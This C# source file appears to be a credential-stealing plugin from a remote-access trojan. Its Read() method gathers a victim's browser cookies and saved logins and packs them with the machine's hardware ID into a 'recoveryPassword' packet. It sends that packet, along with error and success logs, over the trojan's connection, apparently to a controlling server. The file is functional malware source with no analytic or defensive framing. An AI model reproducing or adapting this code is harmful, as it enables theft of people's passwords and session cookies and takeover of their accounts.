using MessagePackLib.MessagePack;
using System;
using System.Text;

namespace Plugin
{
    public static class Packet
    {
        public static void Read()
        {
            try
            {
                Recorvery.Recorver();
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "recoveryPassword";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Cookies").AsString = Recorvery.totalResults;
                msgpack.ForcePathObject("Logins").AsString = Recorvery.totallogins;
                Connection.Send(msgpack.Encode2Bytes());
                Log(Connection.Hwid + ":recovery success.");
            }
            catch (Exception ex)
            {
                Error(ex.Message);
                Connection.Disconnected();
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}